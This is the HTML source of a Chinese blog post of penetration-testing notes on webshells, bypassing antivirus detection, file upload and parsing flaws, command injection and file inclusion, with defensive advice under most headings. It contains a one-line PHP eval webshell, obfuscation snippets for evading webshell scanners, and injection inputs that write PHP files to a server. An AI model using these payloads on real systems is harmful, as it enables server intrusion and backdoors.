@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="shell是基于计算机的命令语言，同时又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。例如：windows的Powershell，linux的bash（Bourne Again Shell）。 在渗透领域，最常见的shell有webs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="远程shell与提权">
+<meta property="og:url" content="http://example.com/2021/12/20/%E8%BF%9C%E7%A8%8Bshell%E4%B8%8E%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Phoenix">
+<meta property="og:description" content="shell是基于计算机的命令语言，同时又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。例如：windows的Powershell，linux的bash（Bourne Again Shell）。 在渗透领域，最常见的shell有webs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-12-20T03:49:45.000Z">
+<meta property="article:modified_time" content="2021-12-31T04:05:03.641Z">
+<meta property="article:author" content="XUE">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2021/12/20/%E8%BF%9C%E7%A8%8Bshell%E4%B8%8E%E6%8F%90%E6%9D%83/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2021/12/20/%E8%BF%9C%E7%A8%8Bshell%E4%B8%8E%E6%8F%90%E6%9D%83/","path":"2021/12/20/远程shell与提权/","title":"远程shell与提权"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>远程shell与提权 | Phoenix</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Phoenix</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Xue's Blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#WebShell"><span class="nav-number">1.</span> <span class="nav-text">WebShell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%86%E7%B1%BB"><span class="nav-number">1.1.</span> <span class="nav-text">分类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%8D%E6%9D%80"><span class="nav-number">1.2.</span> <span class="nav-text">免杀</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#getshell"><span class="nav-number">1.3.</span> <span class="nav-text">getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.1.</span> <span class="nav-text">文件上传漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.2.</span> <span class="nav-text">文件解析漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.3.</span> <span class="nav-text">命令执行漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.4.</span> <span class="nav-text">文件包含漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.5.</span> <span class="nav-text">sql注入漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">1.3.6.</span> <span class="nav-text">其他</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Linux"><span class="nav-number">2.1.</span> <span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows"><span class="nav-number">2.2.</span> <span class="nav-text">Windows</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8Fshell"><span class="nav-number">3.</span> <span class="nav-text">交互式shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Linux-1"><span class="nav-number">3.1.</span> <span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows-1"><span class="nav-number">3.2.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MSF"><span class="nav-number">3.3.</span> <span class="nav-text">MSF</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%B6%E4%BB%96-1"><span class="nav-number">3.3.1.</span> <span class="nav-text">其他</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#hash%E5%AF%86%E7%A0%81%E8%BF%9C%E7%A8%8B%E6%94%BB%E5%87%BB"><span class="nav-number">3.3.2.</span> <span class="nav-text">hash密码远程攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows-2"><span class="nav-number">4.1.</span> <span class="nav-text">Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">4.1.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#exp%E6%8F%90%E6%9D%83"><span class="nav-number">4.1.2.</span> <span class="nav-text">exp提权</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E6%8F%90%E6%9D%83"><span class="nav-number">4.1.3.</span> <span class="nav-text">工具提权</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#sc%E6%8F%90%E6%9D%83"><span class="nav-number">4.1.4.</span> <span class="nav-text">sc提权</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Linux-2"><span class="nav-number">4.2.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="nav-number">4.2.1.</span> <span class="nav-text">脏牛提权</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="nav-number">4.2.2.</span> <span class="nav-text">sudo提权</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="nav-number">4.2.3.</span> <span class="nav-text">SUID提权</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Mysql"><span class="nav-number">4.3.</span> <span class="nav-text">Mysql</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-1"><span class="nav-number">4.3.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#udf%E6%8F%90%E6%9D%83"><span class="nav-number">4.3.2.</span> <span class="nav-text">udf提权</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#mof%E6%8F%90%E6%9D%83"><span class="nav-number">4.3.3.</span> <span class="nav-text">mof提权</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="nav-number">4.3.4.</span> <span class="nav-text">启动项提权</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.4.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">XUE</p>
+  <div class="site-description" itemprop="description">anyxue</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/20/%E8%BF%9C%E7%A8%8Bshell%E4%B8%8E%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="XUE">
+      <meta itemprop="description" content="anyxue">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phoenix">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          远程shell与提权
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-20 11:49:45" itemprop="dateCreated datePublished" datetime="2021-12-20T11:49:45+08:00">2021-12-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2021-12-31 12:05:03" itemprop="dateModified" datetime="2021-12-31T12:05:03+08:00">2021-12-31</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>shell是基于计算机的命令语言，同时又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。例如：windows的Powershell，linux的bash（Bourne Again Shell）。</p>
+<p>在渗透领域，最常见的shell有webshell、反弹shell和交互式shell。</p>
+<h4 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h4><p>webshell常常被称为匿名用户（入侵者）通过网站端口对网站服务器的某种程度上操作的权限。由 于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p>
+<h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p>根据脚本语言可分为PHP脚本木马，ASP脚本木马，也有.NET的脚本木马、JSP脚本木马和python编写的脚本木马。基于大小和功能，可分为大马、小马、一句话木马。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">大马</span></span><br><span class="line">体积大，功能全。会调用系统的关键函数，以代码加密的方式进行隐藏</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">小马</span></span><br><span class="line">体积小，功能少。只有一个上传功能</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">一句话木马</span></span><br><span class="line">php常用eval和assert做调用，短小精悍，历史悠久，比较实用</span><br><span class="line">e.g. #&lt;php? @eval($_GET[&#x27;123&#x27;]) ?&gt;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">常用webshell客户端</span></span><br><span class="line">中国菜刀(支持PHP、JSP、ASP)、蚁剑(PHP、ASP)、冰蝎(流量加密)</span><br></pre></td></tr></table></figure>
+
+<p>另外需要注意的是，我们做渗透的时候，可能经常在网上找一些木马程序，但是好多别人做好的木马程序都存在后门（现在菜刀、冰蝎也有）。所以我们可以先在自己的实验用的虚拟机上先测试一下。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过源代码来查找</span><br><span class="line">通过网络请求和响应进行分析</span><br><span class="line">各种编码解码来还原数据</span><br></pre></td></tr></table></figure>
+
+<h5 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h5><p>木马设计的最终目的是利用上传漏洞到服务器实现远程控制。那么相应的网站防木马机制也很多，比如常见的D盾、安全狗、护卫神等防护软件的查杀功能，还有专门做木马查杀的河马、WebShellkiller等查杀软件。那么就需要对木马做免杀处理，绕过查杀软件的检测。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">基于php5</span><br><span class="line"><span class="meta">#</span><span class="bash">引用变量</span></span><br><span class="line">通过多次引用变量，即一连串赋值操作，从而规避一些朔源查杀</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">可变变量</span></span><br><span class="line">利用可变变量的赋值方式实现免杀</span><br><span class="line">e.g. $a=&#x27;an&#x27;;</span><br><span class="line">     $$a=$_POST[&#x27;a&#x27;];</span><br><span class="line">     eval($an);</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">混淆</span></span><br><span class="line">添加\r\n\t、空字节、反引号或注释符进行干扰</span><br><span class="line">e.g. e.&#x27;&#x27;.&#x27;&#x27;.val(`/**123**/`.$_POST[&#x27;a&#x27;])</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">数组</span></span><br><span class="line">array()+var_dump()</span><br><span class="line">array()+array_intersect_key()+array_keys()</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">变形</span></span><br><span class="line">常用函数：substr()、strtr()、substr_replace()、trim()</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">回调函数</span></span><br><span class="line">array_map()、array_filter()、array_walk()、call_user_func()、call_user_func_array()</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">异或&amp;编码</span></span><br><span class="line">添加&#x27;^&#x27;&#x27;!&#x27;</span><br><span class="line">添加加密/解码方式：rot13、base64</span><br></pre></td></tr></table></figure>
+
+<h5 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h5><p>对网站获取webshell的方式可称为getshell。</p>
+<h6 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h6><p>在文件上传过程中，未对上传文件的格式、内容进行验证，导致恶意文件被上传执行。通常会为攻击者留下网站后门。一般配合解析漏洞可以轻松获取webshell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">通常需要有上传文件的地方，可根据网站指纹或通过富文本编辑器查找相关上传漏洞。代码审查常见于见于move_uploaded_file()</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">绕过</span></span><br><span class="line">文件上传漏洞检测方式通常有基于客户端的js过滤和服务器端的过滤</span><br><span class="line">针对js过滤，可以用firebug查找并修改限制的属性值或bp修改http相关请求值</span><br><span class="line">后端过滤一般为mime验证、目录验证、黑名单和白名单，可以采用bp抓包修改content-type类型，%00截断，windows:$data文件流、大小写/双写/点空格/文件头/条件竞争、图片马配合解析漏洞进行绕过</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">防范</span></span><br><span class="line">采用白名单过滤、特殊字符过滤、严格路径验证、文件重命名</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">常见上传限制函数</span> </span><br><span class="line">getimggetsize() exif_imagetype()限制图片大小格式 str_ireplace()过滤关键字 strtolower()小写 trim()末尾去空 deldot()末尾去点 addslashes()双引号反斜杠</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">常见文件读取函数(见于文件下载)</span></span><br><span class="line">file_get_contents()、highlight_file()、fopen()、readfile()、fread()、fgetss()、fgets()、parse_ini_file()、show_source()、file()</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">文件删除函数</span></span><br><span class="line">unlink(),session_destroy()(老版本)</span><br></pre></td></tr></table></figure>
+
+<h6 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h6><p>文件解析漏洞,是指Web容器（Apache、Nginx、IIS等）在解析文件时将文件解析成脚本文件格式并得以执行而产生的漏洞。利用此漏洞同样可以getshell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">iis</span></span><br><span class="line">iis 5.x/6.x:  *.asp;.jpg   /asp/1.jpg</span><br><span class="line">iis 7.0/7.5:  x.jpg%20\0.php            #cgi.fix_pathinfo配置不当</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">nginx</span></span><br><span class="line">nginx 0.8.41-1.4.3/1.5.0-1.5.7 (cve-2013-4547):访问路径test.gif/.php  抓包修改test.gif[0x20][0x00].php</span><br><span class="line">nginx 0.5/0.6/0.7&lt;=0.7.65/0.8&lt;=0.8.37:   x.jpg%00.php</span><br><span class="line">phpstudy 8.1.0.7:  x.jpg/.php</span><br><span class="line"></span><br><span class="line">与iis7.0/7.5类似，php.ini配置中cgi.fix_pathinfo开启的话，配合nginx的特性，url末尾为.php的任意路径都会当成php解析,新版本php引入了security.limit_extensions参数,限制该漏洞执行。</span><br><span class="line">e.g. http://x.x.x.x/xx.jpg/1.php</span><br><span class="line"></span><br><span class="line">.user.ini可防止跨站跨目录访问读取，也可用来做绕过黑名单的上传解析文件。他是动态加载文件，即无需重启服务，只需等待user_ini.cache_ttl所设置的时间即可（默认300s）</span><br><span class="line">利用条件：</span><br><span class="line">服务器脚本语言为PHP、服务器使用CGI／FastCGI模式、上传目录下要有可执行的php文件</span><br><span class="line">auto_prepend_file/auto_append_file=x.gif  #使目录下php文件执行时底部/顶部包含x.gif   </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">apache</span></span><br><span class="line">apache 2.0.x&lt;=2.0.59/2.2.x&lt;=2.2.17/2.2.2&lt;=2.2.8:解析规则从右到左判断（当后缀名不可识别）</span><br><span class="line">e.g. x.php.ss.ss2</span><br><span class="line">apache 2.4.0-2.4.29（cve-2017-15715）:后缀末尾包含换行符绕过  xx.php\x0a (pb抓包)</span><br><span class="line"></span><br><span class="line">/etc/apache2/apache2.conf配置问题：</span><br><span class="line">SetHandler application/x-httpd-php   #&lt;FilesMatch &quot;文件名&quot;&gt;标签指定文件名解析php</span><br><span class="line">AddHandler php5-script .php          #包含&#x27;.php&#x27;解析php</span><br><span class="line">AddType application/x-httpd-php .jpg #&#x27;.jpg&#x27;解析php</span><br><span class="line">默认正则表达式匹配：php3，php4，php5，pht，phtml等文件后缀解析php</span><br><span class="line"></span><br><span class="line">/etc/apache2/sites-available/default配置：</span><br><span class="line">AllowOverride All</span><br><span class="line">a2enmod rewrite</span><br><span class="line">则.htaccess配置在子目录可以生效 #.htaccess 分布式子目录伪静态配置文件,配置同上</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">windows系统</span></span><br><span class="line">文件名不能以空格或.开头，也不能以空格或.结尾。当把一个文件命名为以空格或点开头或结尾时，会自动地去掉开头和结尾处的空格和&#x27;.&#x27;。</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">防范</span></span><br><span class="line">升级版本</span><br><span class="line">后缀名白名单，字符串过滤</span><br><span class="line">检查相关配置文件关闭危险参数（AllowOverride None、a2dismod rewrite、cgi.fix_pathinfo=0）</span><br><span class="line">禁止上传目录执行php文件</span><br><span class="line">设置上传目录在单独服务器，与业务服务器隔离</span><br></pre></td></tr></table></figure>
+
+<h6 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h6><p>利用命令执行漏洞写入WebShell文件。命令执行漏洞有系统命令函数（代码）、框架执行漏洞。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">注入</span></span><br><span class="line">e.g. ;echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt;123.php #Linux</span><br><span class="line">e.g. ||echo ^&lt;^?php phpinfo(); ?^&gt;^ &gt;123.php  #Windows</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">php系统命令执行函数</span></span><br><span class="line">system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">php可能存在代码执行漏洞函数</span></span><br><span class="line">preg_replace()、ob_start()、array_map()、call_user_func()、call_user_func_array()</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">防范</span></span><br><span class="line">尽量不使用系统执行命令</span><br><span class="line">过滤变量，敏感字符转义</span><br><span class="line">确保使用的动态函数是指定的函数之一</span><br><span class="line">禁用一些危险函数</span><br></pre></td></tr></table></figure>
+
+<h6 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h6><p>利用文件包含漏洞打开webshell文件。在php中，本地包含需先开启PHP的配置文件项allow_url_include和allow_url_fopen，远程包含只需开启allow_url_fopen。一般先上传带有webshell内容的文件，然后利用包含漏洞文件包含此文件即可。当然，配置上面提到的.user.ini也是可以的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">php文件包含函数</span></span><br><span class="line">include()、include_once()、require()、require_once()</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">日志包含</span></span><br><span class="line">通过抓包修改请求数据，再包含日志文件getshell</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">封装协议包含（本地包含）</span></span><br><span class="line">php://input     #只读流，用于获取原始的POST数据，可以用file_get_contents()函数获取内容,enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的</span><br><span class="line">php://filter    #数据流打开筛选过滤，php://filter/convert.base64-encode/resource=文件path</span><br><span class="line">file://         #访问本地文件系统</span><br><span class="line">ftp://--ftps:// #访问ftp(s) url</span><br><span class="line">zip://          #访问压缩包文件，与包含函数结合时，会解析成php文件</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">防范</span></span><br><span class="line">检查服务器配置文件，如php.ini</span><br><span class="line">过滤特殊符号，白名单判断</span><br><span class="line">php配置open_basedir设置文件目录</span><br></pre></td></tr></table></figure>
+
